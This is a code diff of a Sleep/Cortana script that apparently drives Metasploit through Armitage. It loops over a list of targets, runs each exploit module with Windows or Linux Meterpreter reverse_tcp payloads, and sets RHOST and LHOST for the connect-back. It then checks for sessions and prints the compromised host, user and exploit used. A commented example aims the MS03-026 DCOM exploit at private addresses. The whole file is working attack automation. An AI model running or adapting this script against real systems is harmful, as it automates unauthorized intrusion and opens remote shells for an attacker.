@@ -1,47 +1,64 @@
+on ready {
+   #fire_event_local("sessionHandle");
+}
+
 command arguments {
-   local('$counter @attacks $payload');
+   local('$counter @attacks');
 
    $counter = $1;
+   #@attacks = split(';', "windows/dcerpc/ms03_026_dcom,172.16.221.132,172.16.221.1,windows;");
    @attacks = split(';', "$2");
-   $payload = determinePayload($3);
-   
-   fire_event_local("launch_attacks", $counter, @attacks, $payload);
+
+   fire_event_local("launch_attacks", $counter, @attacks);
 }
 
 on launch_attacks {
-   local('$attack $exploit $rhost $lhost $os $console $name');
+   local('$attack $exploit $rhost $lhost $os $console $name $payload');
    $console = console();
    
    foreach $attack ($2) {
-      ($name, $rhost, $lhost, $os) = split(',', $attack);
+      ($rhost, $name, $lhost, $os) = split(',', $attack);
       $exploit = "exploit/" . $name;
       
+      $payload = determinePayload($os);
       cmd($console, "use $exploit");
-      cmd_set($console, %(rhost => "$rhost", $lhost => "$lhost", payload => "$3",
-         target => "0"));
+      cmd_set($console, %(RHOST => "$rhost", LHOST => "$lhost", PAYLOAD => "$payload",
+         TARGET => "0"));
       cmd($console, "exploit -j");
       
-      sleep(10000);
+      sleep(15000);
       cmd($console, "jobs -K");
+      if (size(sessions()) > 0) {
+         fire_event_local("sessionHandle");
+      }
    }
-    
-   quit();
+   fire_event_local("noSessions");
 }
 
 sub determinePayload {
    if ($1 == "windows") {
-	   return "windows/meterpreter/reverse_tcp";
+      return "windows/meterpreter/reverse_tcp";
    }
    return "linux/x86/meterpreter/reverse_tcp";
 }
 
-on session_open {
-   local('$flag $host $user $sessionNum %r');
-   %r = $2;
+on sessionHandle {
+   local('%out @ids $flag $sessionNum $host $user %r $exploit');
+   
+   @ids = session_ids();
+   %out = sessions();
+   $sessionNum = @ids[0];
+   %r = %out[$sessionNum];
    $flag = "success";
-   $sessionNum = $1;
    $host = %r["host"];
    $user = %r["username"];
-   println("$flag" . "," . "$sessionNum" . "," . "$host" . "," . "$user");
+   $exploit = split('/', %r["via_exploit"], 2)[1];
+
+   println("$flag" . "," . "$sessionNum" . "," . "$host" . "," . "$user" . "," . "$exploit");
+   quit();
+}
+
+on noSessions {
+   println("failure,0,0,0");
    quit();
 }
